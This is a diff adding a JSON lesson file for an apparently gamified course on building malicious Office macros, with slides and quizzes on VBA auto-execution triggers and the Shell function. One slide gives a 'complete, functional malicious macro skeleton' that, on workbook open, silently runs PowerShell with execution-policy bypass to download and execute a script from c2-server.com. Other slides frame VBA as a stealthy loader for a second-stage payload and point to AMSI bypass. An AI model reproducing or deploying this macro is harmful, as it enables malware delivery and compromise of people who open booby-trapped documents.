@@ -1,0 +1,123 @@
+{
+    "id": "l2",
+    "chapterId": "ch_10",
+    "title": "VBA Macro Fundamentals",
+    "description": "Learn the essential VBA syntax and functions needed to create a functional malicious macro.",
+    "xpReward": 40,
+    "estimatedMinutes": 10,
+    "section": "Technical Foundations",
+    "slides": [
+        {
+            "id": "s_l2_1",
+            "type": "text",
+            "title": "Accessing the VBA Editor 🛠️",
+            "content": "# Your Development Environment\n\n**How to Open the VBA Editor:**\n1.  Open Word/Excel.\n2.  Press **`Alt + F11`** (The sacred key combo).\n3.  The **Microsoft Visual Basic for Applications** window appears.\n\n**Key Components:**\n- **Project Explorer (Left Pane):** Shows `VBAProject (Document1)` and `Microsoft Excel Objects`.\n- **Code Window (Right Pane):** Where you write your code.\n- **Immediate Window (`Ctrl+G`):** For testing and debugging.\n\n**First Steps:**\n- Right-click `VBAProject` -> `Insert` -> `Module`. This creates a **Module** where you'll write your code.\n- To make a macro run automatically when the document opens, you use special subroutine names."
+        },
+        {
+            "id": "s_l2_2",
+            "type": "quiz",
+            "title": "VBA Editor Access 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l2_1",
+                "type": "multiple_choice",
+                "question": "What is the keyboard shortcut to open the VBA Editor in Microsoft Office?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "Ctrl + V",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "Alt + F11",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "Windows Key + R",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "F5",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Correct. `Alt + F11` toggles the VBA Editor in all Office applications.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l2_3",
+            "type": "code",
+            "title": "Your First Macro: Hello World 👋",
+            "content": "A simple macro to display a message box:",
+            "codeSnippet": "Sub HelloWorld()\n    MsgBox \"Hello, World! This macro executed.\"\nEnd Sub",
+            "codeLanguage": "vba",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l2_4",
+            "type": "text",
+            "title": "Auto-Execution Triggers 🚀",
+            "content": "# Making the Macro Run Automatically\n\nYou don't want the user to manually run the macro. You want it to fire when they **open the document** or **enable content**.\n\n| Subroutine Name | Document Type | When It Runs |\n| :--- | :--- | :--- |\n| `AutoOpen()` | Word | When document opens (if macros enabled) |\n| `Document_Open()` | Word | When document opens (event-driven) |\n| `Workbook_Open()` | Excel | When workbook opens |\n| `Auto_Open()` | Excel | Legacy, but still works |\n| `AutoExec()` | Word | Even earlier in the load process |\n\n**Example (Excel):**\n```vba\nPrivate Sub Workbook_Open()\n    MsgBox \"This runs when the workbook opens!\"\nEnd Sub\n```\n\n**Note:** This code must be placed in the **`ThisWorkbook`** object, not a standard Module."
+        },
+        {
+            "id": "s_l2_5",
+            "type": "quiz",
+            "title": "Auto-Execution Triggers 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l2_2",
+                "type": "multiple_choice",
+                "question": "In an Excel maldoc, which subroutine name should you use to execute code automatically when the file is opened?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "AutoOpen()",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "Workbook_Open()",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "Main()",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "Document_Open()",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Correct. `Workbook_Open()` is the standard event handler for Excel workbooks. `Document_Open()` is for Word.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l2_6",
+            "type": "text",
+            "title": "Executing System Commands 💻",
+            "content": "# The `Shell` Function\n\nTo run external programs (PowerShell, cmd.exe, wscript), you use the **`Shell`** function.\n\n**Syntax:**\n```vba\nShell(pathname, [windowstyle])\n```\n\n**Parameters:**\n- `pathname`: The command to execute.\n- `windowstyle` (Optional):\n  - `vbHide` (0): Hidden window (stealthy).\n  - `vbNormalFocus` (1): Visible window (not stealthy).\n  - `vbMinimizedFocus` (2): Minimized.\n\n**Example: Opening Notepad**\n```vba\nSub OpenNotepad()\n    Shell \"notepad.exe\", vbNormalFocus\nEnd Sub\n```\n\n**Example: Running PowerShell (Stealthy)**\n```vba\nSub RunPowerShell()\n    Shell \"powershell.exe -WindowStyle Hidden -Command Write-Host 'Hello'\", vbHide\nEnd Sub\n```"
+        },
+        {
+            "id": "s_l2_7",
+            "type": "code",
+            "title": "Combining AutoOpen and Shell 🧩",
+            "content": "A complete, functional malicious macro skeleton (Excel):",
+            "codeSnippet": "Private Sub Workbook_Open()\n    ' This runs when the user enables content\n    Dim strCmd As String\n    \n    ' Command to download and execute a PowerShell script\n    strCmd = \"powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \" & _\n              \"IEX(New-Object Net.WebClient).DownloadString('http://c2-server.com/payload.ps1')\"\n    \n    ' Execute the command silently\n    Shell strCmd, vbHide\nEnd Sub",
+            "codeLanguage": "vba",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l2_8",
+            "type": "warning",
+            "title": "VBA Limitations and Considerations 🚧",
+            "content": "## What You Can and Cannot Do\n\n**Can Do:**\n- Execute shell commands (PowerShell, CMD, WScript).\n- Read/write files on the system (with user permissions).\n- Access the internet (`XMLHTTP` object).\n- Manipulate the document content (to show a 'lure').\n\n**Cannot Do (Easily):**\n- Directly inject shellcode into memory (requires advanced WinAPI calls).\n- Bypass AMSI without additional techniques (Lesson 5).\n- Run if Macros are **completely disabled** via Group Policy.\n\n**The VBA Approach:** VBA is your **loader**. It downloads and executes the **real payload** (a C# assembly, PowerShell script, or executable). Keep the VBA simple and let the second stage do the heavy lifting."
+        }
+    ]
+}
